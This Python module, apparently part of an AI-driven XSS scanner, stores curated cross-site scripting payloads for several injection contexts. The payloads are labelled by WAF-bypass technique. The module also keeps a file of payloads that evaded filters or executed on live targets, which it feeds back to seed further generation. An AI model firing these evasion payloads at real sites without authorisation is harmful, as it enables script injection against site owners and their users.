"""Multi-tier XSS payload seed pool — learns from scan outcomes over time.

Tiers
-----
BOOTSTRAP (0):  Curated complex payloads baked into the codebase.
                Always present even on a fresh install.  Never evicted.
SURVIVED  (1):  AI-generated payloads that were fired at a reflective target
                but did not confirm JS execution.  Represents "reached the WAF
                and wasn't fully blocked".
CONFIRMED (2):  Payloads with confirmed JS execution on a real target.
                Highest signal — promoted from any scan that fires alert().

Why three tiers?
----------------
The cold-start problem: without confirmed findings there is nothing to learn
from.  Bootstrap solves this by injecting curated complexity on day one.
Tier 1 solves the sparse-reward problem: you don't need confirmed execution to
learn that a WAF allows certain constructs through.  Tier 2 is the gold
standard but takes time to accumulate.

Storage
-------
BOOTSTRAP seeds are defined in code (never on disk) so codebase updates
automatically improve them.

Tier 1 and 2 seeds are appended to ~/.axss/seed_pool.jsonl (one JSON object
per line).  Writes are best-effort — a race condition between worker processes
may corrupt at most one line, which is silently skipped on read.

Scope discipline
----------------
select_seeds() returns at most *n* seeds (default 6) so the prompt stays
focused.  Distribution: 2 bootstrap → fill remaining with confirmed → survived
→ more bootstrap.  WAF-matched seeds are preferred when a WAF is known.
"""
from __future__ import annotations

import json
import threading
from dataclasses import dataclass
from datetime import datetime, timezone
from enum import IntEnum
from pathlib import Path
from typing import Any

from ai_xss_generator.config import CONFIG_DIR

POOL_PATH = CONFIG_DIR / "seed_pool.jsonl"

# Per-context caps to keep the file from growing unboundedly
_MAX_SURVIVED_PER_CONTEXT = 40
_MAX_CONFIRMED_PER_CONTEXT = 30

_DEFAULT_N = 6


class SeedTier(IntEnum):
    BOOTSTRAP = 0
    SURVIVED = 1
    CONFIRMED = 2


# ---------------------------------------------------------------------------
# Bootstrap payloads — curated complex seeds per context type.
# Each payload should represent a DISTINCT bypass family and be genuinely
# obfuscated, not the simple canonical form.  These are the "starter culture"
# that ensures the model always has high-complexity examples to mutate.
# ---------------------------------------------------------------------------
_BOOTSTRAP: dict[str, list[dict[str, Any]]] = {
    "html_body": [
        {
            "payload": "<img/src='x'onerror\x3dalert(1)>",
            "bypass_family": "hex-char-obfuscation",
            "tags": ["html", "onerror", "hex-separator", "evasion"],
        },
        {
            "payload": "<sVg/onlOaD=alert(1)>",
            "bypass_family": "case-mixing",
            "tags": ["svg", "case-mix", "auto-trigger", "evasion"],
        },
        {
            "payload": "<math><mtext></table></math><img src=x onerror=alert(1)>",
            "bypass_family": "namespace-confusion",
            "tags": ["mathml", "parser-differential", "namespace", "evasion"],
        },
        {
            "payload": "<svg><animatetransform onbegin=alert(1)>",
            "bypass_family": "svg-animation-events",
            "tags": ["svg", "animation", "onbegin", "evasion"],
        },
        {
            "payload": "<!--<img src=--><img src=x onerror=alert(1)>",
            "bypass_family": "comment-breakout",
            "tags": ["html-comment", "breakout", "onerror", "evasion"],
        },
        {
            "payload": "<dEtails open oNtoggLe=alert(document.domain)>",
            "bypass_family": "case-mixing",
            "tags": ["details", "ontoggle", "case-mix", "auto-trigger"],
        },
    ],
    "html_attr_value": [
        {
            "payload": '" onmouseover="alert(1)" x="',
            "bypass_family": "attribute-breakout-dquote",
            "tags": ["attribute", "dquote", "mouseover", "breakout"],
        },
        {
            "payload": "' autofocus onfocusin='alert(1)",
            "bypass_family": "attribute-breakout-squote",
            "tags": ["attribute", "squote", "autofocus", "auto-trigger"],
        },
        {
            "payload": '" onpointerdown="alert(1)',
            "bypass_family": "pointer-event",
            "tags": ["attribute", "pointer-event", "dquote", "evasion"],
        },
        {
            "payload": '"/><svg/onload=alert(1)><!--',
            "bypass_family": "tag-breakout",
            "tags": ["attribute", "tag-close", "svg", "comment-tail"],
        },
        {
            "payload": "\x22onmouseenter=alert(1) x=\x22",
            "bypass_family": "hex-quote-obfuscation",
            "tags": ["attribute", "hex-encoded", "mouseenter", "evasion"],
        },
    ],
    "javascript_string": [
        {
            "payload": "';alert(1)//",
            "bypass_family": "js-string-breakout",
            "tags": ["js-context", "squote", "breakout", "comment"],
        },
        {
            "payload": "\\x27;alert(1)//",
            "bypass_family": "hex-quote-js",
            "tags": ["js-context", "hex-encoded", "squote", "evasion"],
        },
        {
            "payload": "\\u0027;alert(1)//",
            "bypass_family": "unicode-quote",
            "tags": ["js-context", "unicode", "squote", "evasion"],
        },
        {
            "payload": "'+String.fromCharCode(97,108,101,114,116)(1)+'",
            "bypass_family": "fromcharcode",
            "tags": ["js-context", "charcode", "concatenation", "evasion"],
        },
        {
            "payload": "\\x5c';alert\\x281\\x29//",
            "bypass_family": "hex-multi-obfuscation",
            "tags": ["js-context", "backslash", "hex-parens", "multi-encode"],
        },
    ],
    "url_href": [
        {
            "payload": "javascript:alert(1)",
            "bypass_family": "protocol-handler",
            "tags": ["url", "javascript-protocol", "href"],
        },
        {
            "payload": "JaVaScRiPt:alert(1)",
            "bypass_family": "protocol-case-mix",
            "tags": ["url", "javascript-protocol", "case-mix", "evasion"],
        },
        {
            "payload": "javascript://%0aalert(1)",
            "bypass_family": "newline-protocol",
            "tags": ["url", "javascript-protocol", "newline-bypass", "evasion"],
        },
        {
            "payload": "data:text/html,<img src=x onerror=alert(1)>",
            "bypass_family": "data-uri",
            "tags": ["url", "data-uri", "html-injection"],
        },
    ],
    "template_expression": [
        {
            "payload": "{{constructor.constructor('alert(1)')()}}",
            "bypass_family": "constructor-chain",
            "tags": ["template", "angular", "constructor", "sandbox-escape"],
        },
        {
            "payload": "${alert(1)}",
            "bypass_family": "template-literal",
            "tags": ["template", "es6", "literal", "expression"],
        },
        {
            "payload": "{{['constructor']['constructor']('alert(1)')()}}",
            "bypass_family": "bracket-constructor",
            "tags": ["template", "angular", "bracket-notation", "evasion"],
        },
        {
            "payload": "{{$on.constructor('alert(1)')()}}",
            "bypass_family": "angular-event",
            "tags": ["template", "angular", "event-object", "sandbox-escape"],
        },
    ],
    "script_block": [
        {
            "payload": "</script><script>alert(1)</script>",
            "bypass_family": "script-close-reopen",
            "tags": ["script", "close-tag", "reopen", "breakout"],
        },
        {
            "payload": "</scRipT><img src=x onerror=alert(1)>",
            "bypass_family": "script-close-case-mix",
            "tags": ["script", "close-tag", "case-mix", "onerror"],
        },
        {
            "payload": "alert\\x281\\x29",
            "bypass_family": "hex-parens",
            "tags": ["script", "hex-encoded", "parens", "evasion"],
        },
        {
            "payload": "\\u0061\\u006c\\u0065\\u0072\\u0074(1)",
            "bypass_family": "unicode-function",
            "tags": ["script", "unicode", "function-name", "evasion"],
        },
    ],
}

# Fallback bootstrap for unmapped context types
_BOOTSTRAP_FALLBACK: list[dict[str, Any]] = [
    {
        "payload": "<img/src='x'onerror\x3dalert(1)>",
        "bypass_family": "hex-char-obfuscation",
        "tags": ["html", "onerror", "evasion"],
    },
    {
        "payload": "<sVg/onlOaD=alert(1)>",
        "bypass_family": "case-mixing",
        "tags": ["svg", "case-mix", "auto-trigger"],
    },
    {
        "payload": "';alert(1)//",
        "bypass_family": "js-string-breakout",
        "tags": ["js-context", "squote", "breakout"],
    },
]

# Map variant context names → canonical bootstrap key
_CONTEXT_ALIASES: dict[str, str] = {
    "html": "html_body",
    "html_tag": "html_body",
    "html_content": "html_body",
    "attribute": "html_attr_value",
    "html_attr": "html_attr_value",
    "js_string": "javascript_string",
    "javascript": "javascript_string",
    "js_context": "javascript_string",
    "href": "url_href",
    "url": "url_href",
    "src": "url_href",
    "template": "template_expression",
    "angular": "template_expression",
    "script": "script_block",
}


def _bootstrap_for_context(context_type: str) -> list[dict[str, Any]]:
    ct = (context_type or "").lower().strip()
    key = _CONTEXT_ALIASES.get(ct, ct)
    return list(_BOOTSTRAP.get(key, _BOOTSTRAP_FALLBACK))


# ---------------------------------------------------------------------------
# Disk seed entries
# ---------------------------------------------------------------------------

@dataclass
class SeedEntry:
    payload: str
    context_type: str
    tier: SeedTier
    bypass_family: str = ""
    waf: str = ""
    surviving_chars: str = ""
    first_seen: str = ""
    last_seen: str = ""
    hit_count: int = 1
    source: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "context_type": self.context_type,
            "tier": int(self.tier),
            "bypass_family": self.bypass_family,
            "waf": self.waf,
            "surviving_chars": self.surviving_chars,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "hit_count": self.hit_count,
            "source": self.source,
        }

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> "SeedEntry":
        return cls(
            payload=str(d.get("payload", "")),
            context_type=str(d.get("context_type", "html_body")),
            tier=SeedTier(int(d.get("tier", 1))),
            bypass_family=str(d.get("bypass_family", "")),
            waf=str(d.get("waf", "")),
            surviving_chars=str(d.get("surviving_chars", "")),
            first_seen=str(d.get("first_seen", "")),
            last_seen=str(d.get("last_seen", "")),
            hit_count=int(d.get("hit_count", 1)),
            source=str(d.get("source", "")),
        )


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Pool — the main public interface
# ---------------------------------------------------------------------------

# Per-process in-memory cache (refreshed on first access per process lifetime)
_cache: list[SeedEntry] | None = None
_cache_lock = threading.Lock()


def _load_from_disk() -> list[SeedEntry]:
    entries: list[SeedEntry] = []
    try:
        for raw_line in POOL_PATH.read_text(encoding="utf-8").splitlines():
            line = raw_line.strip()
            if not line:
                continue
            try:
                entries.append(SeedEntry.from_dict(json.loads(line)))
            except Exception:
                continue  # skip malformed lines
    except (FileNotFoundError, OSError):
        pass
    except Exception:
        pass
    return entries


def _get_cached() -> list[SeedEntry]:
    global _cache
    with _cache_lock:
        if _cache is None:
            _cache = _load_from_disk()
        return _cache


def _append_to_disk(entry: SeedEntry) -> None:
    """Append one entry to the pool file.  Best-effort — silently ignores errors."""
    try:
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        line = json.dumps(entry.to_dict(), ensure_ascii=False) + "\n"
        with open(POOL_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass


class SeedPool:
    """Read/write interface to the multi-tier seed pool.

    Instantiate once per scan (or once per worker process).  Reads are
    cached in memory for the lifetime of the process.
    """

    # ------------------------------------------------------------------
    # Writes
    # ------------------------------------------------------------------

    def add_survived(
        self,
        payload: str,
        context_type: str,
        *,
        waf: str = "",
        bypass_family: str = "",
        surviving_chars: str = "",
        source: str = "",
    ) -> None:
        """Record a payload fired at a reflective target without confirmed execution.

        Represents "the WAF didn't block this construct".  Tier 1.
        """
        payload = (payload or "").strip()
        if not payload:
            return
        entry = SeedEntry(
            payload=payload,
            context_type=(context_type or "html_body").lower(),
            tier=SeedTier.SURVIVED,
            bypass_family=bypass_family or "",
            waf=(waf or "").lower(),
            surviving_chars=surviving_chars or "",
            first_seen=_now_iso(),
            last_seen=_now_iso(),
            hit_count=1,
            source=source or "",
        )
        _append_to_disk(entry)
        # Invalidate in-memory cache so next select_seeds() sees the new entry
        global _cache
        with _cache_lock:
            _cache = None

    def add_confirmed(
        self,
        payload: str,
        context_type: str,
        *,
        waf: str = "",
        bypass_family: str = "",
        surviving_chars: str = "",
        source: str = "",
    ) -> None:
        """Record a payload with confirmed JS execution.  Tier 2 (highest signal)."""
        payload = (payload or "").strip()
        if not payload:
            return
        entry = SeedEntry(
            payload=payload,
            context_type=(context_type or "html_body").lower(),
            tier=SeedTier.CONFIRMED,
            bypass_family=bypass_family or "",
            waf=(waf or "").lower(),
            surviving_chars=surviving_chars or "",
            first_seen=_now_iso(),
            last_seen=_now_iso(),
            hit_count=1,
            source=source or "",
        )
        _append_to_disk(entry)
        global _cache
        with _cache_lock:
            _cache = None

    # ------------------------------------------------------------------
    # Reads
    # ------------------------------------------------------------------

    def select_seeds(
        self,
        context_type: str,
        waf: str | None = None,
        n: int = _DEFAULT_N,
    ) -> list[dict[str, Any]]:
        """Return up to *n* seed dicts for the prompt, mixed across all tiers.

        Distribution strategy:
          - 2 bootstrap seeds always included (grounding + complexity floor)
          - Fill remaining slots: confirmed first, then survived, then more bootstrap
          - WAF-matched disk seeds are preferred when a WAF name is known

        Returns dicts with keys: payload, bypass_family, tags.
        """
        ct = (context_type or "html_body").lower().strip()
        seen: set[str] = set()
        selected: list[dict[str, Any]] = []

        # -- Bootstrap: always include 2 diverse seeds --------------------------
        bootstrap = _bootstrap_for_context(ct)
        for b in bootstrap[:2]:
            p = b.get("payload", "")
            if p and p not in seen:
                seen.add(p)
                selected.append({
                    "payload": p,
                    "bypass_family": b.get("bypass_family", ""),
                    "tags": b.get("tags", [])[:4],
                })

        # -- Disk seeds: confirmed > survived, waf-match preferred --------------
        disk = [s for s in _get_cached() if s.context_type == ct]
        waf_norm = (waf or "").lower().strip()

        def _disk_sort_key(s: SeedEntry) -> tuple:
            waf_match = 0 if (waf_norm and s.waf == waf_norm) else 1
            return (waf_match, -int(s.tier), -s.hit_count)

        disk.sort(key=_disk_sort_key)

        for s in disk:
            if len(selected) >= n:
                break
            p = s.payload.strip()
            if not p or p in seen:
                continue
            seen.add(p)
            tags = [f"tier:{int(s.tier)}"]
            if s.waf:
                tags.append(f"waf:{s.waf}")
            selected.append({
                "payload": p,
                "bypass_family": s.bypass_family or "",
                "tags": tags[:4],
            })

        # -- Fill remainder with more bootstrap seeds ---------------------------
        for b in bootstrap[2:]:
            if len(selected) >= n:
                break
            p = b.get("payload", "")
            if p and p not in seen:
                seen.add(p)
                selected.append({
                    "payload": p,
                    "bypass_family": b.get("bypass_family", ""),
                    "tags": b.get("tags", [])[:4],
                })

        return selected[:n]
